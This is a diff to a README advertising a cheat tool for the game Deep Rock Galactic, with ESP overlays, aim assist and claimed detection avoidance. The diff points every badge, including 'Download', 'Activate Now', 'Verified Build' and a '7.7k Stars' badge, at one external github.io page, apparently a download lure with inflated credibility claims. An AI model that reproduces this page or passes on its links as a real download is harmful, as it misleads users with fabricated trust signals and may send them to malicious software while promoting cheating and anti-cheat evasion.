@@ -22,10 +22,10 @@ This isn’t just a basic cheat—it’s a **multifunctional enhancement tool**.
 
 ---
 
-[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](#)
-[![⭐️ 7.7k Stars](https://img.shields.io/badge/GitHub-7.7k_Stars-green?logo=github\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](#)
+[![Activate Now](https://img.shields.io/badge/Activate-Now-red?logo=rocket\&style=for-the-badge)](https://deep-rock-galactic-cheats.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?logo=windows\&style=for-the-badge)](https://deep-rock-galactic-cheats.github.io/.github/)
+[![⭐️ 7.7k Stars](https://img.shields.io/badge/GitHub-7.7k_Stars-green?logo=github\&style=for-the-badge)](https://deep-rock-galactic-cheats.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-brightgreen?logo=github\&style=for-the-badge)](https://deep-rock-galactic-cheats.github.io/.github/)
 
 ---
 
@@ -156,9 +156,9 @@ A: It minimizes detection but no cheat is 100% undetectable.
 
 The **Deep Rock Galactic Cheat Tool** combines **ESP overlays, aim assist, and resource ESP** for a complete edge in mining expeditions and swarm defense. Built for Windows PC players, it ensures precision and awareness in every cave.
 
-[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](#)
-[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](#)
-[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](#)
+[![Verified Build](https://img.shields.io/badge/Verified-Build-success?logo=github\&style=for-the-badge)](https://deep-rock-galactic-cheats.github.io/.github/)
+[![Community](https://img.shields.io/badge/Join-Community-purple?logo=discord\&style=for-the-badge)](https://deep-rock-galactic-cheats.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Now-orange?logo=github\&style=for-the-badge)](https://deep-rock-galactic-cheats.github.io/.github/)
 
 ---
 
